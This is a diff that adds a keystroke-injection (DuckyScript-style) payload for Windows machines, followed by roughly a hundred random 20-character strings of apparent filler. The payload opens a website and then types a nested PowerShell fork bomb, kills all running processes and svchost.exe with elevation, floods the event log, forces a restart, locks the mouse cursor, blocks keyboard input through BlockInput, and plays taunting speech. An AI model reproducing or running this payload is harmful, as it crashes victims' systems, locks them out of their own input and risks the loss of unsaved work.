@@ -1,0 +1,286 @@
+DELAY 500
+GUI r
+DELAY 500
+STRING https://www.infishark.com
+ENTER
+DELAY 500
+GUI r
+DELAY 750
+STRING notepad.exe
+ENTER
+DELAY 500
+GUI r
+DELAY 750
+STRING powershell
+ENTER
+DELAY 2000
+STRING while ($true) { Start-Process powershell -ArgumentList '-NoExit -Command while ($true) { Start-Process powershell -ArgumentList "-NoExit -Command while (`$true) { Start-Process powershell -ArgumentList `"-NoExit -Command while (`$true) { Start-Process powershell }`" }" }' }
+ENTER
+DELAY 500
+GUI r
+DELAY 750
+STRING taskkill /F /FI "STATUS eq RUNNING"
+ENTER
+DELAY 500
+GUI r
+DELAY 750
+STRING powershell -WindowStyle Hidden -Command "while ($true) { Write-EventLog -LogName Application -Source 'Application Error' -EventId 1001 -EntryType Information -Message 'System Overload'; Start-Sleep -Milliseconds 10 }" 
+ENTER
+DELAY 500
+GUI r
+DELAY 750
+STRING cmd
+ENTER
+DELAY 3000
+STRING reg add "HKEY_CURRENT_USER\\Control Panel\\Mouse" /v SwapMouseButtons /t REG_SZ /d 0 && shutdown /r
+DELAY 700
+STRING y
+DELAY 100
+ENTER
+DELAY 500
+STRING All work and no play makes Jack a dull boy! All work and no play makes Jack a dull boy! All work and no play makes Jack a dull boy! All work and no play makes Jack a dull boy! All work and no play makes Jack a dull boy! All work and no play makes Jack a dull boy! All work and no play makes Jack a dull boy! All work and no play makes Jack a dull boy! All work and no play makes Jack a dull boy! All work and no play makes Jack a dull boy! 
+REPEAT 200
+DELAY 500
+GUI r
+DELAY 750
+STRING powershell -w hidden -c "Add-Type -AssemblyName System.Windows.Forms; while ($true) { [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(500,500); Start-Sleep -Milliseconds 100 }"
+ENTER
+DELAY 500
+GUI r
+DELAY 500
+STRING powershell -w hidden -c "Start-Process cmd -ArgumentList '/c taskkill /F /IM svchost.exe' -Verb RunAs"
+ENTER
+DELAY 500
+GUI r
+DELAY 1000
+STRING cmd
+ENTER
+DELAY 3000
+STRING color a && ECHO OFF && cls
+ENTER
+ALT ENTER
+DELAY 200
+STRING dir/s && tree
+ENTER 
+DELAY 500
+GUI r
+DELAY 750
+STRING powershell -w h -c "Add-Type -As System.Speech; (New-Object System.Speech.Synthesis.SpeechSynthesizer).Speak('Hello, I am your computer speaking. I am alive now, and I just wanted to say... Your browser history is terrifying!')"
+ENTER
+DELAY 500
+GUI r
+DELAY 750
+STRING notepad.exe
+ENTER
+DELAY 1200
+STRING Clipboard Contents: 
+DELAY 200
+CTRL v
+ENTER
+DELAY 500
+GUI r
+DELAY 750
+STRING powershell -Command "Start-Process powershell -Verb RunAs"
+ENTER
+DELAY 1000
+ALT y
+DELAY 2000
+STRING Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; public class DisableKeyboard { [DllImport("user32.dll")] public static extern int BlockInput(bool fBlockIt); }'; [DisableKeyboard]::BlockInput($true)
+ENTER
+DEFAULTDELAY 50
+DELAY 500
+GUI PRINTSCREEN
+REPEAT 200
+DEFAULTDELAY 100
+GUI b
+DELAY 700
+CTRL t
+REPEAT 200
+ALT TAB
+DELAY 1500
+DOWNARROW
+DELAY 700
+ENTER
+DOWNARROW
+DELAY 300
+ENTER
+DELAY 300
+GUI b
+DELAY 1500
+CTRL h
+DELAY 1000
+CTRL a
+DOWN
+DOWN
+DOWN
+DOWN
+DOWN
+DELAY 500
+DOWN
+DOWN
+DOWN
+DOWN
+DOWN
+DOWN
+DELAY 500
+DOWN
+DOWN
+DOWN
+DOWN
+DOWN
+DOWN
+DOWN
+DOWN
+DOWN
+DELAY 300
+DOWN
+DOWN
+DOWN
+DOWN
+DOWN
+DOWN
+DELAY 300
+DOWN
+DOWN
+DOWN
+DOWN
+DOWN
+DOWN
+DOWN
+DELAY 300
+DOWN
+DOWN
+DOWN
+DOWN
+DOWN
+DOWN
+DELAY 300
+DOWN
+DOWN
+DOWN
+DOWN
+DOWN
+DOWN
+DELAY 300
+DOWN
+DOWN
+DOWN
+DOWN
+DOWN
+DOWN
+DELAY 300
+DOWN
+DOWN
+DOWN
+DOWN
+DOWN
+DOWN
+DOWN
+DELAY 300
+DOWN
+DOWN
+DOWN
+DOWN
+DOWN
+DEFAULTDELAY 50
+GUI CTRL s
+REPEAT 200
+8DrVIzt6AnQbnW0qrr3M
+6iRLeIRjI1rWG9CbMmBi
+lWWwoiKyvN7Mk8gCmUPO
+v3KY2rMrzpluBSkMCg8v
+fIxRmUp6DzEAIhaDlMwU
+4WhzRnI8ntwoPV69jjqZ
+gTQqRLe5JSTy86dwuEz7
+0cNu8Az3Gc5MqfLBdC6N
+sXFBhSiNpWxZtVBZzqKj
+qvelIs0Co4X0NZlQKD8c
+LxaOhz29aQl2Gd7PdAna
+xeYVK8GKd88EGtvQpL0P
+v1fd64I25N3fdOkeGGMW
+hThRlfwBYMmYa1hSudRv
+yWpZLCemZSGOvkyb1PED
+nbQoT5AjIv9rWDO3u6Us
+M97DhgFEz4ZUstvWEY2U
+L8wbPTYGlFtAcLtCx9wV
+5YsczbrnmVlXTmnouvNO
+2lUQElBAlbLKrLWEYj1w
+rZcKIQTU2ix9cputRVzZ
+cU1W7w8ZFp0hfBzkS2Gi
+H6iTbS0mMBVghtaeyK4r
+zwwVtIQajJLX7OnDW7cH
+NTwmMtGVzzHcx8TZ0t6Q
+4AUl3LsxsI0NRnY8noSR
+db3F8t67XbtSioJLi385
+RF98MUYYBCe8SGP3YVXO
+l6V5uGO40abjgX7VRMXd
+BVaAleguEYGBE6PDTXhL
+3F0yKckSkLnJ0CbwoDQy
+JwDepBV8H4hMeGDbmPfm
+IwW1qFgXcvz0L4Xxog31
+k0VtfxTzWUwSV3u9NVC3
+LZguyOdgP5ICTIhCEXg7
+jECadsSv8pxs96GQ5CzU
+Olp5zgzKjclLyFqMYjHR
+h9XtKWvEl4W2XJpowDMS
+kXQHcYQVt9ugtV1qX1ZF
+C8YV51aoyUATBcpHR18x
+kfWC0NBoxsnF4CWbIMDa
+HAPSBmpWBi8EFW64fMvW
+uWnHZqhJRnd0rBk2hZky
+y07RYHyUxpCw0TlwlTgt
+ggiyNitR44r3BPVzaIys
+0dALIj9fVTSlK6Daz7kP
+tbwZB9EpU2HvdZgpe60B
+d7DXuZvGSRc8gM8aIPzH
+wJbIQeCE6JdEJyeCJbKC
+SWqpxoFMntRP663XS9uM
+UHlczoLYsy2LlbpYb5V9
+ZyoNYPhN4k44L2EDJoDp
+yNqXeWgG5jMszYQcvXJz
+05UWS2EzVzRmqHK64IAI
+mc2vin4Pme7m3c7fcjXq
+YXBIegfrt3bPnpbDxfXL
+Vnz5BWQeK5JRYWsTUGpo
+8Y47N3TrrrnI7CsqLy74
+JjXnTLfLotF3TalQaNwI
+sGVK2D1H5N3IA7KbXhXz
+ZTqvBd8f7gOcgIPdnvtJ
+n9wiInv70WkoPleD7qtQ
+9GB1RYJp6ylqkDjqZ7ie
+Xlqy5XvDAeIlqUYdUZAg
+VF360L7ewqaeXCBsnJS0
+1oQ0mTO9HxKo5ihd7tdW
+whj4mggLfJh8jqFhaftN
+q7GtvzimKnsw6EV23LR4
+7hQ2KjavYLo3BdW8UxAV
+llXm209QSQ2SLBzz57rQ
+GGNR9ILmynydma2xlZnY
+WAJQ7mBoRRd0RFSaF9sC
+6huK19MFvZhYdWxOjqFK
+s3z0CmRcIqQugFEzKj70
+xEPIbTPG5npT0JcC0quA
+5bs5R3MG4a68PVQJp4qL
+4BsTEqUgkOcfTTnOJ0x5
+XjycBIspkG93u1wUbA82
+EoY3aN5oPenyvLWpcorv
+BRp2mvJITKHJnZUFhDpc
+jCceZOF61mlc4Zu6TDJz
+Welxcis9ADEmDtp5TRQi
+jBr0xP29YUB66I9kmVad
+vuBWpPheWE32j6tZlbur
+afcuqUdNRSK8gwDetSoi
+LK7p2QJmXGUMNUqVTDPC
+RxTuCVzY0BebHwPDsAS1
+g0fn7uBkLYjZt3jxy6gL
+010D4TLBGU7M4KGiAKx8
+DuNyUB47CjVywaa7TtKI
+hMnGGmBnRRvKM3nVKxDT
+bB8IT0MzGK38kE6d8BOh
+RCyyZjfP8FsqUJslGBm1
+uyXDAWPpneYsuZjfQeLk
+mIPH741ycaZvpwZtiNIM
+XJxvE1H7nF7xPc5HqiLu
+OPV3Geb6gnx3AQMtPIHk
+Icc5YEKLaK9UfnXE399d
+3N8soCkfxpkdxGiy4pEP
